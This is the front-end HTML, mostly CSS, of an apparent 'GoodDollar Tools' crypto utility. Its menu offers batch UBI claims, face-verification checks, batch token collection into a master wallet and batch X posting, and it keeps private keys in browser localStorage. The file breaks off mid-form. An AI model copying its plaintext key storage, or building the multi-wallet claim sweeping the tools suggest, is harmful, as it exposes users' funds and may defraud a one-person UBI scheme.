<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GoodDollar Tools</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: url('background.jpg') center/cover fixed no-repeat;
            min-height: 100vh;
            position: relative;
            overflow: hidden;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.45);
            z-index: 1;
            pointer-events: none;
        }

        .menu-btn {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(255, 255, 255, 0.95);
            border: none;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 24px;
            cursor: pointer;
            z-index: 100;
            transition: all 0.2s;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
        }

        .menu-btn:hover {
            background: white;
            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.3);
        }

        .menu-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 50;
            display: none;
        }

        .menu-overlay.open {
            display: block;
        }

        .menu-dropdown {
            position: fixed;
            top: 70px;
            right: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
            z-index: 101;
            min-width: 200px;
            display: none;
        }

        .menu-dropdown.open {
            display: block;
        }

        .menu-item {
            padding: 14px 20px;
            border: none;
            background: none;
            width: 100%;
            text-align: left;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            color: #333;
            transition: background 0.2s;
        }

        .menu-item:hover {
            background: #f5f5f5;
        }

        .menu-item:first-child {
            border-radius: 8px 8px 0 0;
        }

        .menu-item:last-child {
            border-radius: 0 0 8px 8px;
        }

        /* Top 2 Premium Menu Items */
        .menu-item:nth-child(1) {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: white;
            font-weight: 700;
            font-size: 15px;
            padding: 16px 20px;
            box-shadow: inset 0 1px 0 rgba(255,255,255,0.2);
            border-radius: 8px 8px 0 0;
        }

        .menu-item:nth-child(1):hover {
            background: linear-gradient(135deg, #059669 0%, #10b981 100%);
            transform: translateY(-1px);
        }

        .menu-item:nth-child(2) {
            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
            color: white;
            font-weight: 700;
            font-size: 15px;
            padding: 16px 20px;
            box-shadow: inset 0 1px 0 rgba(255,255,255,0.2);
            margin-top: 8px;
            border-radius: 6px;
            margin-bottom: 12px;
        }

        .menu-item:nth-child(2):hover {
            background: linear-gradient(135deg, #d97706 0%, #f59e0b 100%);
            transform: translateY(-1px);
        }

        /* Batch Claim and Token Collection Section Headers */
        #batchClaim .container h1,
        #tokenCollection .container h1 {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-size: 36px;
            margin-bottom: 8px;
            animation: fadeInDown 0.5s ease-out;
        }

        @keyframes fadeInDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        #batchClaim .subtitle,
        #tokenCollection .subtitle {
            font-size: 16px;
            color: #666;
            margin-bottom: 20px;
            font-weight: 500;
        }

        /* Card styling for form sections */
        #batchClaim .form-group:first-of-type,
        #tokenCollection .form-group:first-of-type {
            background: linear-gradient(135deg, #f0f9ff 0%, #f5f3ff 100%);
            border: 2px solid #e0e7ff;
            border-radius: 12px;
            padding: 16px;
            margin-top: 20px;
        }

        #batchClaim .warning,
        #tokenCollection .warning {
            background: linear-gradient(135deg, #fef2f2 0%, #fff7ed 100%);
            border-left: 5px solid #dc2626;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            font-size: 14px;
        }

        .settings-panel {
            padding: 20px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            margin: 20px;
            max-width: 400px;
        }

        .settings-panel h3 {
            margin-top: 0;
            color: #333;
            font-size: 18px;
        }

        .link-toggle-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .link-toggle-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px;
            background: #f5f5f5;
            border-radius: 8px;
        }

        .link-toggle-label {
            font-weight: 600;
            color: #333;
        }

        .link-toggle-btn {
            padding: 8px 16px;
            border: none;
            border-radius: 6px;
            font-size: 13px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            transition: all 0.2s;
        }

        .link-toggle-btn:hover {
            transform: scale(1.05);
        }

        /* Chatbot Styles */
        .chatbot-btn {
            position: fixed;
            bottom: 30px;
            right: 30px;
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            border-radius: 50%;
            font-size: 28px;
            cursor: pointer;
            z-index: 99;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
            transition: transform 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }

        .chatbot-btn:hover {
            transform: scale(1.1);
        }

        .chatbot-panel {
            position: fixed;
            bottom: 100px;
            right: 30px;
            width: 350px;
            height: 500px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
            z-index: 99;
            display: none;
            flex-direction: column;
            font-family: 'Noto Sans Bengali', Arial, sans-serif;
        }

        .chatbot-panel.open {
            display: flex;
        }

        .chatbot-header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px;
            border-radius: 12px 12px 0 0;
            font-weight: 700;
            font-size: 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .chatbot-close {
            background: none;
            border: none;
            color: white;
            font-size: 20px;
            cursor: pointer;
        }

        .chatbot-messages {
            flex: 1;
            overflow-y: auto;
            padding: 15px;
            background: #f9f9f9;
        }

        .chatbot-input-area {
            display: flex;
            padding: 15px;
            gap: 10px;
            border-top: 1px solid #ddd;
        }

        .chatbot-input-area input {
            flex: 1;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
        }

        .chatbot-send {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
        }

        .chatbot-sms-banner {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
            color: white;
            padding: 12px;
            text-align: center;
            font-weight: 700;
            font-size: 14px;
            border-bottom: 2px solid #ff5252;
        }

        .chatbot-sms-banner button {
            background: white;
            color: #ff6b6b;
            border: none;
            padding: 6px 12px;
            border-radius: 4px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 8px;
            display: block;
            width: 90%;
            margin-left: auto;
            margin-right: auto;
        }

        .chatbot-dev-info {
            background: #f0f0f0;
            padding: 10px;
            border-bottom: 1px solid #ddd;
            font-size: 11px;
            text-align: center;
            color: #666;
        }

        .chatbot-image-upload {
            background: none;
            border: none;
            color: #667eea;
            cursor: pointer;
            font-weight: 600;
            padding: 6px 10px;
        }

        #chatbotImageInput {
            display: none;
        }

        .view {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 2;
            overflow-y: auto;
            padding: 20px;
        }

        .view.active {
            display: block;
        }

        #landingPage {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        .landing-content {
            text-align: center;
            color: white;
            z-index: 3;
        }

        .landing-content h1 {
            font-size: 48px;
            margin-bottom: 10px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        }

        .landing-content p {
            font-size: 18px;
            margin-bottom: 30px;
            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
        }

        .landing-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 14px 32px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        }

        .landing-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
            background: white;
            border-radius: 12px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            z-index: 3;
            position: relative;
        }

        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }

        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }

        .warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 25px;
            color: #856404;
        }

        .warning strong {
            display: block;
            margin-bottom: 5px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
            font-size: 14px;
        }

        textarea, input[type="text"], input[type="number"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
            transition: border-color 0.3s;
        }

        textarea {
            font-family: 'Courier New', monospace;
            font-size: 13px;
            resize: vertical;
        }

        textarea:focus, input:focus {
            outline: none;
            border-color: #667eea;
        }

        .button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 14px 32px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            width: 100%;
        }

        .button:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
        }

        .button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .validate-btn {
            background: #ff9800;
            color: white;
            border: none;
            padding: 10px 16px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 8px;
        }

        .validate-btn:hover {
            background: #f57c00;
        }

        .logs {
            margin-top: 30px;
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 6px;
            padding: 20px;
            max-height: 500px;
            overflow-y: auto;
        }

        .logs h2 {
            font-size: 18px;
            margin-bottom: 15px;
            color: #333;
        }

        .log-entry {
            padding: 10px;
            margin-bottom: 8px;
            border-radius: 4px;
            font-size: 13px;
            font-family: 'Courier New', monospace;
            line-height: 1.5;
        }

        .log-info {
            background: #e7f3ff;
            border-left: 4px solid #2196F3;
            color: #0d47a1;
        }

        .log-success {
            background: #e8f5e9;
            border-left: 4px solid #4caf50;
            color: #1b5e20;
        }

        .log-error {
            background: #ffebee;
            border-left: 4px solid #f44336;
            color: #b71c1c;
        }

        .log-warning {
            background: #fff3e0;
            border-left: 4px solid #ff9800;
            color: #e65100;
        }

        .tx-hash {
            color: #667eea;
            word-break: break-all;
            text-decoration: underline;
            cursor: pointer;
        }

        .progress {
            margin-top: 20px;
            font-weight: 600;
            color: #667eea;
            font-size: 16px;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-top: 20px;
        }

        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            z-index: 200;
            align-items: center;
            justify-content: center;
        }

        .modal-overlay.active {
            display: flex;
        }

        .modal-content {
            background: white;
            border-radius: 12px;
            padding: 30px;
            max-width: 500px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.3);
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            border-bottom: 2px solid #f0f0f0;
            padding-bottom: 15px;
        }

        .modal-header h2 {
            font-size: 20px;
            color: #333;
            margin: 0;
        }

        .modal-close {
            background: #f0f0f0;
            border: none;
            border-radius: 50%;
            width: 32px;
            height: 32px;
            font-size: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.2s;
        }

        .modal-close:hover {
            background: #e0e0e0;
        }

        .recent-key-item {
            background: #f9f9f9;
            border: 1px solid #ddd;
            border-radius: 6px;
            padding: 12px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            word-break: break-all;
        }

        .recent-key-item:hover {
            background: #f0f0f0;
        }

        .key-actions {
            display: flex;
            gap: 8px;
            white-space: nowrap;
        }

        .key-btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 6px 10px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }

        .key-btn:hover {
            background: #5568d3;
        }

        .key-btn.delete {
            background: #f44336;
        }

        .key-btn.delete:hover {
            background: #d32f2f;
        }

        .modal-warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 6px;
            padding: 12px;
            margin-bottom: 15px;
            font-size: 12px;
            color: #856404;
            line-height: 1.5;
        }

        .modal-empty {
            text-align: center;
            padding: 30px 20px;
            color: #999;
        }

        .modal-empty-icon {
            font-size: 48px;
            margin-bottom: 10px;
            opacity: 0.5;
        }

        .non-claimed-buttons-container {
            display: flex;
            gap: 10px;
            margin-top: 20px;
            margin-bottom: 0;
        }

        .non-claimed-category-btn {
            background: #ff9800;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 6px;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s;
            flex: 1;
            display: none;
        }

        .non-claimed-category-btn:hover {
            background: #f57c00;
        }

        .non-claimed-category-btn.show {
            display: block;
        }

        .non-claimed-category-btn.active {
            background: #f57c00;
            box-shadow: 0 0 10px rgba(255, 152, 0, 0.5);
        }

        .non-claimed-section {
            background: #fff3e0;
            border: 2px solid #ff9800;
            border-radius: 8px;
            padding: 15px;
            margin-top: 10px;
            display: none;
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.3s ease;
        }

        .non-claimed-section.show {
            display: block;
            max-height: 500px;
        }

        .non-claimed-title {
            font-weight: 700;
            color: #e65100;
            margin-bottom: 12px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .non-claimed-list {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .non-claimed-item {
            background: #ffe0b2;
            border: 1px solid #ffb74d;
            border-radius: 6px;
            padding: 10px;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            word-break: break-all;
            line-height: 1.4;
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            gap: 10px;
        }

        .non-claimed-item-content {
            flex: 1;
        }

        .non-claimed-reason {
            color: #d84315;
            font-weight: 600;
            margin-bottom: 3px;
        }

        .copy-btn {
            background: #ff9800;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 11px;
            font-weight: 700;
            white-space: nowrap;
            transition: all 0.2s;
        }

        .copy-btn:hover {
            background: #f57c00;
        }

        .copy-btn.copied {
            background: #4caf50;
        }

        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .modal-overlay.show {
            display: flex;
        }

        .modal-content {
            background: white;
            border-radius: 12px;
            padding: 20px;
            max-width: 90%;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
            min-width: 300px;
        }

        .modal-header {
            font-size: 18px;
            font-weight: 700;
            color: #d84315;
            margin-bottom: 10px;
            border-bottom: 2px solid #ff9800;
            padding-bottom: 10px;
        }

        .modal-description {
            font-size: 13px;
            color: #555;
            margin-bottom: 15px;
            line-height: 1.6;
        }

        .modal-filter {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }

        .filter-btn {
            background: #fff3e0;
            border: 2px solid #ff9800;
            color: #ff9800;
            padding: 8px 12px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            transition: all 0.2s;
        }

        .filter-btn:hover {
            background: #ff9800;
            color: white;
        }

        .filter-btn.active {
            background: #ff9800;
            color: white;
        }

        .modal-copy-all-btn {
            background: #4caf50;
            color: white;
            border: none;
            padding: 10px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            font-size: 13px;
            margin-bottom: 15px;
            transition: all 0.2s;
        }

        .modal-copy-all-btn:hover {
            background: #45a049;
        }

        .modal-copy-all-btn.copied {
            background: #4caf50;
        }

        .modal-keys-list {
            display: flex;
            flex-direction: column;
            gap: 8px;
            margin-bottom: 15px;
        }

        .modal-key-item {
            background: #fff9c4;
            border: 1px solid #ffe082;
            border-radius: 6px;
            padding: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 10px;
        }

        .modal-key-item:hover {
            background: #fff59d;
        }

        .modal-key-item-number {
            width: 25px;
            font-weight: 700;
            color: #666;
            flex-shrink: 0;
        }

        .modal-key-item-key {
            font-family: 'Courier New', monospace;
            font-size: 12px;
            color: #333;
            flex: 1;
            word-break: break-all;
        }

        .modal-key-item-copy {
            background: #ff9800;
            color: white;
            border: none;
            padding: 6px 10px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 11px;
            font-weight: 600;
            white-space: nowrap;
            transition: all 0.2s;
            flex-shrink: 0;
        }

        .modal-key-item-copy:hover {
            background: #f57c00;
        }

        .modal-key-item-copy.copied {
            background: #4caf50;
        }

        .modal-reason-box {
            background: #fff3e0;
            border: 2px solid #ff9800;
            border-radius: 6px;
            padding: 12px;
            margin-top: 15px;
            font-size: 12px;
            color: #d84315;
            font-weight: 600;
        }

        .modal-view-btn {
            background: #f0f0f0;
            color: #333;
            border: 2px solid #ddd;
            padding: 8px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            transition: all 0.2s;
        }

        .modal-view-btn:hover {
            background: #e0e0e0;
        }

        .modal-view-btn.active {
            background: #4caf50;
            color: white;
            border-color: #4caf50;
        }

        .modal-actions {
            display: flex;
            gap: 10px;
            justify-content: flex-end;
            margin-top: 15px;
            padding-top: 15px;
            border-top: 2px solid #ffe0b2;
        }

        .modal-btn {
            padding: 10px 16px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            font-size: 13px;
            transition: all 0.2s;
        }

        .modal-btn-close {
            background: #e0e0e0;
            color: #333;
        }

        .modal-btn-close:hover {
            background: #d0d0d0;
        }

        .modal-btn-primary {
            background: #ff9800;
            color: white;
        }

        .modal-btn-primary:hover {
            background: #f57c00;
        }

        .stat-card {
            background: white;
            padding: 15px;
            border-radius: 6px;
            border: 2px solid #e0e0e0;
            text-align: center;
        }

        .stat-value {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 5px;
        }

        .stat-label {
            font-size: 12px;
            color: #666;
            text-transform: uppercase;
        }

        .stat-success .stat-value {
            color: #4caf50;
        }

        .stat-error .stat-value {
            color: #f44336;
        }

        .stat-total .stat-value {
            color: #2196F3;
        }

        .validation-section {
            margin-top: 15px;
            padding: 15px;
            background: #fff3e0;
            border: 1px solid #ffb74d;
            border-radius: 6px;
            display: none;
        }

        .validation-section.show {
            display: block;
        }

        .validation-title {
            font-weight: 600;
            color: #e65100;
            margin-bottom: 12px;
            font-size: 14px;
        }

        .invalid-key-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #ffe0b2;
            padding: 10px;
            margin-bottom: 8px;
            border-radius: 4px;
            font-size: 12px;
            font-family: 'Courier New', monospace;
            word-break: break-all;
        }

        .delete-btn {
            background: #f44336;
            color: white;
            border: none;
            padding: 6px 12px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            white-space: nowrap;
            margin-left: 10px;
            flex-shrink: 0;
        }

        .delete-btn:hover {
            background: #d32f2f;
        }

        .validation-status {
            font-size: 13px;
            margin-top: 10px;
            padding: 10px;
            background: white;
            border-radius: 4px;
            color: #333;
        }

        .validation-status.valid {
            color: #1b5e20;
            border-left: 4px solid #4caf50;
        }

        .validation-status.invalid {
            color: #b71c1c;
            border-left: 4px solid #f44336;
        }

        .contact-section {
            margin-top: 40px;
            padding: 25px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 12px;
            color: white;
        }

        .contact-section h3 {
            font-size: 18px;
            margin-bottom: 18px;
            font-weight: 700;
        }

        .contact-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .contact-item {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 14px;
        }

        .contact-item strong {
            min-width: 100px;
            font-weight: 600;
        }

        .contact-item a {
            color: #e0e0e0;
            text-decoration: none;
            word-break: break-all;
            transition: color 0.2s;
        }

        .contact-item a:hover {
            color: #fff;
            text-decoration: underline;
        }

        .balance-summary {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }

        .balance-total {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 25px;
            border-radius: 8px;
            color: white;
            text-align: center;
        }

        .balance-total-label {
            font-size: 12px;
            text-transform: uppercase;
            opacity: 0.9;
            margin-bottom: 10px;
            font-weight: 600;
        }

        .balance-total-value {
            font-size: 32px;
            font-weight: 700;
            word-break: break-word;
        }

        .balance-table-container {
            overflow-x: auto;
            border: 1px solid #ddd;
            border-radius: 8px;
        }

        .balance-table {
            width: 100%;
            border-collapse: collapse;
            background: white;
        }

        .balance-table thead {
            background: #f8f9fa;
            border-bottom: 2px solid #ddd;
        }

        .balance-table th {
            padding: 12px 15px;
            text-align: left;
            font-weight: 600;
            color: #333;
            font-size: 13px;
        }

        .balance-table td {
            padding: 12px 15px;
            border-bottom: 1px solid #eee;
            font-size: 13px;
        }

        .balance-table tr:last-child td {
            border-bottom: none;
        }

        .balance-table tr:hover {
            background: #f8f9fa;
        }

        .wallet-address {
            font-family: 'Courier New', monospace;
            font-size: 12px;
            color: #666;
            word-break: break-all;
        }

        .balance-loading {
            text-align: center;
            padding: 40px 20px;
            color: #666;
        }

        .balance-error {
            background: #ffebee;
            border: 1px solid #f44336;
            padding: 15px;
            border-radius: 6px;
            color: #b71c1c;
            margin-top: 20px;
        }

        /* Daily Tasks Styling */
        .task-card {
            background: rgba(30, 41, 59, 0.8);
            border: 2px solid #4f46e5;
            border-radius: 12px;
            padding: 25px;
            margin: 20px 0;
            color: #fff;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
        }

        .task-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 15px;
        }

        .task-icon {
            font-size: 28px;
        }

        .task-title {
            font-size: 20px;
            font-weight: 700;
            color: #fff;
        }

        .task-subtitle {
            font-size: 14px;
            color: #a0aec0;
            margin-top: 8px;
        }

        .task-status {
            display: inline-block;
            background: #48bb78;
            color: white;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            margin-top: 10px;
        }

        .task-status.completed {
            background: #4299e1;
        }

        .task-options {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin: 20px 0;
        }

        .task-option-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            color: white;
            padding: 15px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            font-size: 16px;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .task-option-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(102, 126, 234, 0.4);
        }

        .task-option-btn:active {
            transform: translateY(0);
        }

        .claim-btn {
            background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);
            width: 100%;
            margin-top: 15px;
            padding: 12px;
            font-size: 16px;
        }

        .claim-btn:hover {
            box-shadow: 0 6px 12px rgba(72, 187, 120, 0.4);
        }

        .claim-btn:disabled {
            background: #cbd5e0;
            cursor: not-allowed;
            opacity: 0.6;
        }

        .wallet-section {
            background: rgba(30, 41, 59, 0.6);
            border: 1px solid #4f46e5;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }

        .wallet-info {
            font-size: 14px;
            color: #cbd5e0;
            margin: 8px 0;
        }

        .wallet-address {
            font-family: 'Courier New', monospace;
            word-break: break-all;
            color: #4299e1;
            margin-top: 5px;
        }

        .balance-display {
            background: rgba(30, 41, 59, 0.8);
            border-left: 4px solid #48bb78;
            border-radius: 6px;
            padding: 15px;
            margin: 15px 0;
        }

        .balance-label {
            color: #a0aec0;
            font-size: 12px;
            margin-bottom: 5px;
        }

        .balance-value {
            font-size: 28px;
            font-weight: 700;
            color: #48bb78;
        }

        @media (max-width: 600px) {
            .landing-content h1 {
                font-size: 32px;
            }

            .landing-content p {
                font-size: 16px;
            }

            .stats {
                grid-template-columns: 1fr;
            }
        }

        /* Disable all form elements in temporarily unavailable features */
        #batchCall input, #batchCall select, #batchCall textarea, #batchCall button:not([onclick="switchView"]),
        #batchClaim input, #batchClaim select, #batchClaim textarea, #batchClaim button:not([onclick="switchView"]),
        #multiGoodDollarSender input, #multiGoodDollarSender select, #multiGoodDollarSender textarea, #multiGoodDollarSender button:not([onclick="switchView"]),
        #balanceChecker input, #balanceChecker select, #balanceChecker textarea, #balanceChecker button:not([onclick="switchView"]),
        #swap input, #swap select, #swap textarea, #swap button:not([onclick="switchView"]),
        #dailyTasks input, #dailyTasks select, #dailyTasks textarea, #dailyTasks button:not([onclick="switchView"]),
        #helpSupport input, #helpSupport select, #helpSupport textarea, #helpSupport button:not([onclick="switchView"]),
        #batchXPost input, #batchXPost select, #batchXPost textarea, #batchXPost button:not([onclick="switchView"]) {
            opacity: 0.4 !important;
            cursor: not-allowed !important;
            pointer-events: none !important;
            background-color: #ccc !important;
        }
    </style>
</head>
<body>
    <!-- Menu Button -->
    <button class="menu-btn" onclick="toggleMenu()">‚ãÆ</button>
    <div class="menu-overlay" id="menuOverlay" onclick="closeMenu()"></div>
    
    <div class="menu-dropdown" id="menuDropdown">
        <button class="menu-item" onclick="switchView('batchClaim')">üì¶ Batch Claim</button>
        <button class="menu-item" onclick="switchView('faceVerificationCheck')">üë§ Face Verification Check</button>
        <button class="menu-item" onclick="switchView('tokenCollection')">üí∞ Batch Token Collection</button>
        <button class="menu-item" onclick="switchView('batchCall')">‚ö° Batch Call (Multicall)</button>
        <button class="menu-item" onclick="switchView('multiSender')">üì§ Multi Sender (CELO)</button>
        <button class="menu-item" onclick="switchView('multiGoodDollarSender')">üí∏ Multi G$ Sender</button>
        <button class="menu-item" onclick="switchView('balanceChecker')">üíº Wallet Balance Checker</button>
        <button class="menu-item" onclick="switchView('swap')">üí± Swap (Uniswap/Reserve)</button>
        <button class="menu-item" onclick="switchView('batchXPost')">ùïè Batch X Post</button>
        <button class="menu-item" onclick="switchView('dailyTasks')">üéØ Daily Tasks</button>
        <button class="menu-item" onclick="openSecretBoxWithPasswordPrompt()" style="color: #d4226f;">üîê Anamul App</button>
        <button class="menu-item" onclick="showRecentClaimsModal()" style="border-top: 1px solid #eee; color: #667eea;">‚è∞ Recent Claims</button>
        <button class="menu-item" onclick="showMasterWalletModal()" style="color: #ff9800;">üëë Master Wallet</button>
        <button class="menu-item" onclick="switchView('helpSupport')" style="border-top: 1px solid #eee; color: #e74c3c;">‚ùì Help & Support</button>
        <button class="menu-item" onclick="switchView('faq')" style="color: #667eea;">üìö FAQ</button>
        <button class="menu-item" onclick="switchView('disclaimer')" style="color: #ff6b6b;">‚öñÔ∏è Disclaimer</button>
    </div>

    <!-- Recent Claims Modal -->
    <div class="modal-overlay" id="recentClaimsModal" onclick="closeRecentClaimsModal(event)">
        <div class="modal-content" onclick="event.stopPropagation()">
            <div class="modal-header">
                <h2>‚è∞ Recent Claims</h2>
                <button class="modal-close" onclick="closeRecentClaimsModal()">√ó</button>
            </div>
            <div class="modal-warning">
                ‚ö†Ô∏è <strong>Security Notice:</strong> Private keys are stored in your browser's local storage. Never share these keys with anyone. Clear them after use for maximum security.
            </div>
            <div id="recentKeysContainer"></div>
        </div>
    </div>

    <!-- Master Wallet Modal -->
    <div class="modal-overlay" id="masterWalletModal" onclick="closeMasterWalletModal(event)">
        <div class="modal-content" onclick="event.stopPropagation()">
            <div class="modal-header">
                <h2>üëë Master Wallet</h2>
                <button class="modal-close" onclick="closeMasterWalletModal()">√ó</button>
            </div>
            <div class="modal-warning">
                ‚ö†Ô∏è <strong>Security Notice:</strong> This master wallet is used as the destination for batch token collection. Never share this key with anyone. It's stored in your browser's local storage.
            </div>
            <!-- Saved Wallet Status -->
            <div id="savedWalletStatus" style="padding: 12px; background: #d4edda; border: 2px solid #48bb78; border-radius: 6px; margin-bottom: 15px; display: none;">
                <div style="color: #155724; font-weight: 700; margin-bottom: 8px;">‚úÖ Wallet Saved!</div>
                <div style="display: flex; gap: 10px;">
                    <button class="button" onclick="loadMasterWalletDisplay()" style="flex: 1; background: #48bb78; color: white;">üëÅÔ∏è View Saved Wallet</button>
                    <button class="button" onclick="deleteMasterWallet()" style="flex: 1; background: #f44336; color: white;">üóëÔ∏è Delete</button>
                </div>
            </div>

            <div style="margin: 20px 0;">
                <label for="masterWalletKey" style="display: block; margin-bottom: 10px; font-weight: 700;">üíæ Save New Master Wallet Private Key:</label>
